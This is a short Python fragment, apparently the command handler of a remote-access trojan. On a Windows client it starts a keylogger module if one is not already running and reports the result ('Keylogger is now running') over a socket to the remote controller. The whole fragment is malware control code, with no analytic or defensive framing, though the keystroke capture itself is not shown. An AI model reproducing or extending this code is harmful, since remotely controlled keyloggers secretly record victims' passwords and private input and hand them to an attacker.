
if win_client():
    nt_kl.stop_freeze()
status = nt_kl.get_status()
if status:
    resp = '[+] Keylogger is already running\n'
else:
    nt_kl.start()
    status = nt_kl.get_status()
    if status:
        resp = '[+] Keylogger is now running\n'
    else:
        resp = '[!] Keylogger failed to start\n'

send(client_socket,resp)
